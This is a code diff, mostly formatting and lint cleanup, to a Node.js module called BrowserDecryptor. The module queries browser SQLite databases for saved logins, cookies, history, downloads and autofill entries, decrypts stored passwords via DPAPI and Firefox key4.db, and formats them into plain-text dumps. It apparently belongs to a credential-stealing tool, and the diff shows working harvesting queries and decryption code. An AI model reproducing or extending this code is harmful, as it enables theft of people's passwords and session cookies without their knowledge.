@@ -7,7 +7,6 @@ const fs = require('fs');
 const path = require('path');
 const Database = require('better-sqlite3');
 const { logger } = require('../../core/logger');
-const { ErrorHandler, ModuleError } = require('../../core/errors');
 
 // Try to load DPAPI module - will only work on Windows
 let Dpapi = null;
@@ -103,7 +102,9 @@ class BrowserDecryptor {
             // Clean up temp file
             try {
                 fs.unlinkSync(tempFile);
-            } catch (e) {}
+            } catch (cleanupError) {
+                // Ignore cleanup errors
+            }
             
             return data;
         } catch (error) {
@@ -111,7 +112,9 @@ class BrowserDecryptor {
             // Clean up temp file
             try {
                 fs.unlinkSync(tempFile);
-            } catch (e) {}
+            } catch (cleanupError) {
+                // Ignore cleanup errors
+            }
             return [];
         }
     }
@@ -128,49 +131,49 @@ class BrowserDecryptor {
         let processor = null;
 
         switch (dataType) {
-            case 'passwords':
-                query = `SELECT origin_url, username_value, password_value, date_created 
+        case 'passwords':
+            query = `SELECT origin_url, username_value, password_value, date_created 
                         FROM logins 
                         WHERE blacklisted_by_user = 0 
                         ORDER BY date_created DESC`;
-                processor = this.processPasswordRow.bind(this);
-                break;
+            processor = this.processPasswordRow.bind(this);
+            break;
 
-            case 'cookies':
-                query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
+        case 'cookies':
+            query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
                         FROM cookies 
                         ORDER BY creation_utc DESC 
                         LIMIT 1000`;
-                processor = this.processCookieRow.bind(this);
-                break;
+            processor = this.processCookieRow.bind(this);
+            break;
 
-            case 'history':
-                query = `SELECT url, title, visit_count, last_visit_time 
+        case 'history':
+            query = `SELECT url, title, visit_count, last_visit_time 
                         FROM urls 
                         WHERE visit_count > 0 
                         ORDER BY last_visit_time DESC 
                         LIMIT 1000`;
-                processor = this.processHistoryRow.bind(this);
-                break;
+            processor = this.processHistoryRow.bind(this);
+            break;
 
-            case 'downloads':
-                query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
+        case 'downloads':
+            query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
                         FROM downloads 
                         ORDER BY start_time DESC 
                         LIMIT 500`;
-                processor = this.processDownloadRow.bind(this);
-                break;
+            processor = this.processDownloadRow.bind(this);
+            break;
 
-            case 'autofill':
-                query = `SELECT name, value, count, date_created 
+        case 'autofill':
+            query = `SELECT name, value, count, date_created 
                         FROM autofill 
                         ORDER BY count DESC, date_created DESC 
                         LIMIT 500`;
-                processor = this.processAutofillRow.bind(this);
-                break;
+            processor = this.processAutofillRow.bind(this);
+            break;
 
-            default:
-                return [];
+        default:
+            return [];
         }
 
         try {
@@ -703,7 +706,6 @@ class BrowserDecryptor {
             
             // Try to check if Firefox has a master password set
             const key4Path = path.join(profileDir, 'key4.db');
-            const cert9Path = path.join(profileDir, 'cert9.db');
             
             if (!fs.existsSync(key4Path)) {
                 logger.debug('Firefox key4.db not found, cannot decrypt NSS data');
@@ -805,7 +807,7 @@ class BrowserDecryptor {
 
             // Decrypt with enhanced error handling
             try {
-                let decrypted = decipher.update(ciphertext);
+                const decrypted = decipher.update(ciphertext);
                 decipher.final(); // This will throw if authentication fails
                 
                 const result = decrypted.toString('utf8');
@@ -867,74 +869,74 @@ class BrowserDecryptor {
         let text = `=== ${dataType.toUpperCase()} (${data.length} entries) ===\n\n`;
 
         switch (dataType) {
-            case 'passwords':
-                data.forEach((item, index) => {
-                    text += `[${index + 1}] ${item.url}\n`;
-                    text += `Username: ${item.username}\n`;
-                    text += `Password: ${item.password}\n`;
-                    text += `Date Created: ${item.dateCreated}\n`;
-                    text += `${'='.repeat(50)}\n\n`;
-                });
-                break;
+        case 'passwords':
+            data.forEach((item, index) => {
+                text += `[${index + 1}] ${item.url}\n`;
+                text += `Username: ${item.username}\n`;
+                text += `Password: ${item.password}\n`;
+                text += `Date Created: ${item.dateCreated}\n`;
+                text += `${'='.repeat(50)}\n\n`;
+            });
+            break;
 
-            case 'cookies':
-                data.forEach((item, index) => {
-                    text += `[${index + 1}] ${item.host}\n`;
-                    text += `Name: ${item.name}\n`;
-                    text += `Value: ${item.value}\n`;
-                    text += `Path: ${item.path}\n`;
-                    text += `Secure: ${item.secure}\n`;
-                    text += `HttpOnly: ${item.httpOnly}\n`;
-                    text += `Expires: ${item.expires}\n`;
-                    text += `Created: ${item.created}\n`;
-                    text += `${'='.repeat(50)}\n\n`;
-                });
-                break;
+        case 'cookies':
+            data.forEach((item, index) => {
+                text += `[${index + 1}] ${item.host}\n`;
+                text += `Name: ${item.name}\n`;
+                text += `Value: ${item.value}\n`;
+                text += `Path: ${item.path}\n`;
+                text += `Secure: ${item.secure}\n`;
+                text += `HttpOnly: ${item.httpOnly}\n`;
+                text += `Expires: ${item.expires}\n`;
+                text += `Created: ${item.created}\n`;
+                text += `${'='.repeat(50)}\n\n`;
+            });
+            break;
 
-            case 'history':
-                data.forEach((item, index) => {
-                    text += `[${index + 1}] ${item.title}\n`;
-                    text += `URL: ${item.url}\n`;
-                    text += `Visit Count: ${item.visitCount}\n`;
-                    text += `Last Visit: ${item.lastVisit}\n`;
-                    text += `${'='.repeat(50)}\n\n`;
-                });
-                break;
+        case 'history':
+            data.forEach((item, index) => {
+                text += `[${index + 1}] ${item.title}\n`;
+                text += `URL: ${item.url}\n`;
+                text += `Visit Count: ${item.visitCount}\n`;
+                text += `Last Visit: ${item.lastVisit}\n`;
+                text += `${'='.repeat(50)}\n\n`;
+            });
+            break;
 
-            case 'downloads':
-                data.forEach((item, index) => {
-                    text += `[${index + 1}] ${path.basename(item.path)}\n`;
-                    text += `Full Path: ${item.path}\n`;
-                    text += `Referrer: ${item.referrer}\n`;
-                    text += `Size: ${item.size} bytes\n`;
-                    text += `Start Time: ${item.startTime}\n`;
-                    text += `End Time: ${item.endTime}\n`;
-                    text += `${'='.repeat(50)}\n\n`;
-                });
-                break;
+        case 'downloads':
+            data.forEach((item, index) => {
+                text += `[${index + 1}] ${path.basename(item.path)}\n`;
+                text += `Full Path: ${item.path}\n`;
+                text += `Referrer: ${item.referrer}\n`;
+                text += `Size: ${item.size} bytes\n`;
+                text += `Start Time: ${item.startTime}\n`;
+                text += `End Time: ${item.endTime}\n`;
+                text += `${'='.repeat(50)}\n\n`;
+            });
+            break;
 
-            case 'autofill':
-                data.forEach((item, index) => {
-                    text += `[${index + 1}] ${item.name}\n`;
-                    text += `Value: ${item.value}\n`;
-                    text += `Count: ${item.count}\n`;
-                    text += `Date Created: ${item.dateCreated}\n`;
-                    text += `${'='.repeat(50)}\n\n`;
-                });
-                break;
+        case 'autofill':
+            data.forEach((item, index) => {
+                text += `[${index + 1}] ${item.name}\n`;
+                text += `Value: ${item.value}\n`;
+                text += `Count: ${item.count}\n`;
+                text += `Date Created: ${item.dateCreated}\n`;
+                text += `${'='.repeat(50)}\n\n`;
+            });
+            break;
 
-            case 'bookmarks':
-                data.forEach((item, index) => {
-                    text += `[${index + 1}] ${item.name}\n`;
-                    text += `URL: ${item.url}\n`;
-                    text += `Folder: ${item.folder}\n`;
-                    text += `Date Added: ${item.dateAdded}\n`;
-                    text += `${'='.repeat(50)}\n\n`;
-                });
-                break;
+        case 'bookmarks':
+            data.forEach((item, index) => {
+                text += `[${index + 1}] ${item.name}\n`;
+                text += `URL: ${item.url}\n`;
+                text += `Folder: ${item.folder}\n`;
+                text += `Date Added: ${item.dateAdded}\n`;
+                text += `${'='.repeat(50)}\n\n`;
+            });
+            break;
 
-            default:
-                text += JSON.stringify(data, null, 2);
+        default:
+            text += JSON.stringify(data, null, 2);
         }
 
         return text;
